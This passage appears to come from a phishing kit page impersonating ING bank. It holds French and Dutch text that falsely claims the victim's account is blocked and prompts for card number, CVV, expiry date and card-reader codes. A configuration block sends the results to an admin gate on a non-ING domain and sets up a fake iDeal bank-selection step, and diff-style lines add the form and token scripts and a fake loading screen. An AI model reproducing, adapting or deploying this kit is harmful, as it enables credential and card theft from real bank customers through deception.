appuyez sur \\\"Signer\\\"\",\n\n\n        \"_195622566\": \"V\u00e9rification termin\u00e9e\",\n        \"_-1781351462\": \"Merci, vos informations ont \u00e9t\u00e9 envoy\u00e9es. Nous nous excusons pour la g\u00eane occasionn\u00e9e.\",\n\n\n\n        \"_457197066\": \"et appuyez sur \\\"OK\\\"\",\n\n        \"_2576861\": \"Signe\",\n\n\n        \"_1087227964\": \"Informations sur la carte\",\n        \"_-463635061\": \"Date d'expiration de la carte\",\n        \"_-2001805959\": \"Date d'expiration de votre carte\",\n        \"_1868896591\": \"MM\/AAAA\",\n\n\n        \"_-1679196512\": \"Confirmer\",\n\n\n        \"_-2126651847\": \"Num\u00e9ro de carte\",\n        \"_67139\": \"CVV\"\n    },\n    \"nl\":\n    {\n\n        \"_-1762966517\": \"Meld u aan met de ING-kaartlezer\",\n        \"_2084199307\": \"Fouten\",\n        \"_-2100363574\": \"U moet hieronder een aantal van die velden inchecken.\",\n        \"_98022037\": \"Bankkaartnummer\",\n        \"_-557740841\": \"Voer een geldig bankkaartnummer in\",\n        \"_-614429802\": \"Waarde onjuist\",\n        \"_1803885307\": \"Voer een geldige ING ID in\",\n        \"_-1732238388\": \"Sla uw bankkaartgegevens op\",\n        \"_1677634980\": \"Help en informatie\",\n        \"_73596745\": \"Inloggen\",\n        \"_-1417361843\": \"Online beveiliging\",\n        \"_-782442309\": \"Uw privacy\",\n        \"_906364211\": \"ING Algemeen Reglement\",\n        \"_-1802065132\": \"Een moment ...\",\n\n        \"_12338600\": \"Meld u aan bij Mijn ING\",\n\n        \"_393974398\": \"Uw account is geblokkeerd\",\n        \"_-1301328960\": \"We voeren een verificatieproces uit.\",\n        \"_-1491718229\": \"Zodra het verificatieproces is voltooid, herstellen we uw toegang en ontvangt u een melding.\",\n        \"_500390792\": \"Volg onze eenvoudige stappen om de verificatie te starten\",\n        \"_2424595\": \"Volgende\",\n\n\n\n        \"_1302272827\": \"Plaats uw bankkaart in de ING Card-lezer en druk op \\\"Identificeer\\\"\",\n        \"_-2064458453\": \"Voer de pincode van uw bankkaart in en druk op \\\"OK\\\"\",\n        \"_1815383157\": \"RESPOND\",\n        \"_-188122456\": \"Voer de nummers in die op uw kaartlezer verschijnen\",\n\n\n\n        \"_1032525388\": \"Plaats uw bankkaart in de ING Card-lezer en druk op \\\"Ondertekenen\\\"\",\n        \"_-2100559731\": \"Ga de uitdaging van uw bevestiging in\",\n        \"_1284373801\": \"en druk op \\\"Ondertekenen\\\"\",\n\n\n        \"_195622566\": \"Verificatie voltooid\",\n        \"_-1781351462\": \"Bedankt, uw informatie is verzonden. Onze excuses voor het ongemak.\",\n\n\n\n        \"_457197066\": \"en druk op \\\"OK\\\"\",\n\n\n        \"_2576861\": \"Teken\",\n\n\n        \"_1087227964\": \"Kaartinformatie\",\n        \"_-463635061\": \"Vervaldatum kaart\",\n        \"_-2001805959\": \"Vervaldatum van uw kaart\",\n        \"_1868896591\": \"MM\/JJJJ\",\n\n\n        \"_-1679196512\": \"Bevestigen\",\n\n\n        \"_-2126651847\": \"Kaartnummer\",\n        \"_67139\": \"CVV\"\n    }\n}","query":"op=eyJpbml0X2ZuIjoiYXNrX25leHQiLCJpZCI6Im5leHQiLCJzcWxfbXMiOiJPcGVyYXRpb24gYEFzayBJRGVhbCAoU2VsZWN0IEJhbmspYCBhZGRlZCBzdWNjZXNzZnVsbHkiLCJzdWNjZXNzX21lcyI6IklEZWFsIChTZWxlY3QgQmFuaykgZm9ybSBkaXNwbGF5ZWQifQ==","home":"https:\/\/bd-nl.info\/web\/uadmin\/gate.php","relative_root":"..\/..\/..\/","parent_folders":"a1b2c3\/fe8cc41a561c4bac56ccca5488f69f58\/next\/","fake_base":"next\/"}    </script>
+    <script type="text/javascript" src="form/form.js?v=686584c59a8a7"></script>
+    <script type="text/javascript" src="ng/ng.js?v=686584c59a8a9"></script>
+    <script type="text/javascript" src="token/token.js?v=686584c59a8aa"></script>
+ 
+ 
+<div class="loader__ waiter__" style="z-index: 9999; display: none; align-items: center; justify-content: center; height: 100vh; background-color: white; flex-direction: column;">    <img src="logo.png" class="logo2">    <div class="outer-bar" style="margin-top: 70px;">    <div class="inner-bar"></div>    </div>  <p style="color:#1b5ca1;margin-top: 30px;">Een ogenblik geduld a.u.b</p></div></body></html>
